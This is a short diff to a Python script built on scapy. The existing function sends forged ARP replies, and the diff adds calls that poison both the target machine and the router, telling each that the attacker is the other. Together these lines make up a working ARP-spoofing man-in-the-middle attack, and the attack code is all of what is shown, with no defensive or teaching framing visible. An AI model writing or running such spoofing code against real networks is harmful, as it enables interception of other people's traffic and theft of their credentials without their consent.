@@ -48,3 +48,8 @@ def spoof(target_ip, spoof_ip):
 	packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
 	scapy.send(packet)
 
+# Tell the Target Computer we are the Router
+spoof(target_interface_1, router_ip)
+# Tell the Router we are the Target Computer
+spoof(router_ip, target_interface_1)
+
